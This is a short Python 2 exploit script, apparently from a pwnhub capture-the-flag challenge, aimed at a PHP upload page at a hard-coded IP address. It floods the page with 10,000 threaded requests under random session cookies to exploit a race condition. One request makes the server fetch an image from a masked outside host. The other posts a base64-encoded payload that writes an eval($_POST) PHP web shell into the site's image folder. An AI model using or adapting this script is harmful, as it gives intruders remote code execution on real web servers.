import requests
import threading
import time
from random import Random
url = "http://52.80.32.116/2d9bc625acb1ba5d0db6f8d0c8b9d206/a9b4d7cc810da015142f61f7e236d50b.php"
def down(cookie):
    data = {'image': 'http://******/pwnhub.png'}
    r = requests.post(url, data = data, cookies=cookie)
def ri(cookie):
    s = requests.Session()
    data = {'pwnhub': 'ZmlsZV9wdXRfY29udGVudHMoIi92YXIvd3d3L2h0bWwvMmQ5YmM2MjVhY2IxYmE1ZDBkYjZmOGQwYzhiOWQyMDYvaW1hZ2UvYW5nZWx0ZXN0LnBocCIsIGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYk1sMHBPejgrIikpOw=='}
    r = s.post(url + "?pwnhub=firesun", data = data, cookies=cookie)
    if "Hacked by Firesun" in r.text:
        print r.text
def random_str(randomlength=8):
    str = ''
    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
    length = len(chars) - 19
    random = Random()
    for i in range(randomlength):
        str+=chars[random.randint(0, length)]
    return str
for i in range(0,10000):
    session = random_str(26)
    cookie = {'PHPSESSID': session}
    threading.Thread(target = down,args = (cookie,)).start()
    threading.Thread(target = ri,args = (cookie,)).start()
